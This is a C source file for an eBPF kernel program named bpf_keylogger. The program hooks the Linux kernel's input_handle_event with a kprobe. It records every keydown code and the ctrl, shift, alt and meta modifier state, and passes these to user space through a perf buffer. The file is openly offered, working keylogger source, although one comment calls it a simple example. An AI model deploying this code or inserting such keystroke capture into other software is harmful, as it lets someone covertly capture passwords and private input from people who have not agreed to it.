/*
    bpf_keylogger: Log key presses and mouse button events systemwide using eBPF
    Copyright (C) 2019  William Findlay

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <linux/input.h>
#include <uapi/linux/input-event-codes.h>

#include "src/bpf/bpf_program.h"
#include "src/bpf/helpers.h"

/* BPF maps below this line -------------------------------------- */

BPF_ARRAY(modifiers, u8, 4);

BPF_PERF_OUTPUT(keypresses);

/* BPF programs below this line ---------------------------------- */

/* https://github.com/torvalds/linux/blob/master/drivers/input/input.c */
int kprobe__input_handle_event(struct pt_regs *ctx, struct input_dev *dev,
                   unsigned int type, unsigned int code, int value)
{
    /* Modifiers */
    u8 *ctrl;
    u8 *shift;
    u8 *alt;
    u8 *meta;

    /* Keypress event */
    struct bkl_key_event kev = {};

    /* Filter keydown events */
    if (type == EV_KEY && value)
    {
#ifdef BKL_DEBUG
        bpf_trace_printk("key down %u\n", code);
#endif

        /* Lookup modifiers */
        int k = BKL_CTRL;
        ctrl = modifiers.lookup(&k);
        k = BKL_SHIFT;
        shift = modifiers.lookup(&k);
        k = BKL_ALT;
        alt = modifiers.lookup(&k);
        k = BKL_META;
        meta = modifiers.lookup(&k);

        /* handle lookup errors */
        if (!ctrl)
        {
            bpf_trace_printk("ERROR: Could not read ctrl modifier from array\n");
            return 0;
        }
        if (!shift)
        {
            bpf_trace_printk("ERROR: Could not read shift modifier from array\n");
            return 0;
        }
        if (!alt)
        {
            bpf_trace_printk("ERROR: Could not read alt modifier from array\n");
            return 0;
        }
        if (!meta)
        {
            bpf_trace_printk("ERROR: Could not read meta modifier from array\n");
            return 0;
        }

        /* Assign key code to event */
        kev.code = code;

        /* Assign modifiers to event */
        kev.ctrl = *ctrl;
        kev.shift = *shift;
        kev.alt = *alt;
        kev.meta = *meta;

        /* Submit event */
        keypresses.perf_submit(ctx, &kev, sizeof(kev));

        /* Maybe set modifiers */
        if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT)
        {
            int k = BKL_SHIFT;
            u8 v = 1;
            modifiers.update(&k, &v);
        }
        if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL)
        {
            int k = BKL_CTRL;
            u8 v = 1;
            modifiers.update(&k, &v);
        }
        if (code == KEY_LEFTALT || code == KEY_RIGHTALT)
        {
            int k = BKL_ALT;
            u8 v = 1;
            modifiers.update(&k, &v);
        }
        if (code == KEY_LEFTMETA || code == KEY_RIGHTMETA)
        {
            int k = BKL_META;
            u8 v = 1;
            modifiers.update(&k, &v);
        }
    }
    /* Filter keyup events */
    else if (type == EV_KEY && !value)
    {
#ifdef BKL_DEBUG
        bpf_trace_printk("key up %u\n", code);
#endif

        /* Maybe reset modifiers */
        if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT)
        {
            int k = BKL_SHIFT;
            u8 v = 0;
            modifiers.update(&k, &v);
        }
        if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL)
        {
            int k = BKL_CTRL;
            u8 v = 0;
            modifiers.update(&k, &v);
        }
        if (code == KEY_LEFTALT || code == KEY_RIGHTALT)
        {
            int k = BKL_ALT;
            u8 v = 0;
            modifiers.update(&k, &v);
        }
        if (code == KEY_LEFTMETA || code == KEY_RIGHTMETA)
        {
            int k = BKL_META;
            u8 v = 0;
            modifiers.update(&k, &v);
        }
    }

    return 0;
}

/* https://github.com/torvalds/linux/blob/master/drivers/input/input.c */
/* We probably don't have to worry about autorepeats for this simple example */
int kprobe__input_repeat_key(struct pt_regs *ctx)
{
#ifdef BKL_DEBUG
    bpf_trace_printk("repeat key!\n");
#endif

    return 0;
}
